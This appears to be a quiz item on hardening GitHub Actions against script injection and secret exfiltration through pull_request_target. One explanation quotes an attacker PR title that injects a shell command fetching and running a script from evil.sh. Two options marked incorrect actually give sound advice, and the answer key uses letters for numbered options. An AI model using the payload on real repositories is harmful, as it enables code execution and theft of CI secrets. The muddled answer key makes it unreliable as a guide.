Question: KestrelPay Clearing maintains a public SDK repo where maintainer labels on external fork PRs post automated benchmark comments. Which two patterns prevent script injection AND `pull_request_target` secret exfiltration (`"pwn requests"`)? Select two.
Answer Option 1: Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
Explanation 1: Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
Answer Option 2: No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately
Explanation 2: Incorrect. Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.
Answer Option 3: No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
Explanation 3: Incorrect. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
Answer Option 4: Prevent **script injection** by never interpolating untrusted `${{ github.event.* }}` (`PR title/body, branch head_ref, issue comment`) directly inside `run:`—bind via `env:` (`PR_TITLE: ${{ ... }}`) and quote `"$PR_TITLE"`
Explanation 4: Correct. GitHub expands `${{ ... }}` **before** handing `run:` text to `bash`/`pwsh`; binding untrusted text into an `env:` variable keeps shell metacharacters (`$(...)`, backticks) inert.
Answer Option 5: Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
Explanation 5: Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
Answer Option 6: Pass untrusted `github.event.*` text (`PR titles, branch names, comments`) through intermediate `env:` variables (`never raw ${{ ... }} inside run:`) and never checkout untrusted forks in `pull_request_target`
Explanation 6: Correct. Binding untrusted event fields to `env:` variables stops shell command injection, and avoiding fork checkouts in `pull_request_target` prevents secret exfiltration.
Overall Explanation: Correct answers: D and F (are correct). Never pass untrusted `github.event.*` fields (`title`, `body`, `head.ref`, commit messages) directly inside `run:`; bind them through step `env:` variables (`"$UNTRUSTED_VAL"`), and NEVER checkout or execute untrusted fork PR `head.sha` code inside a privileged `pull_request_target` workflow.
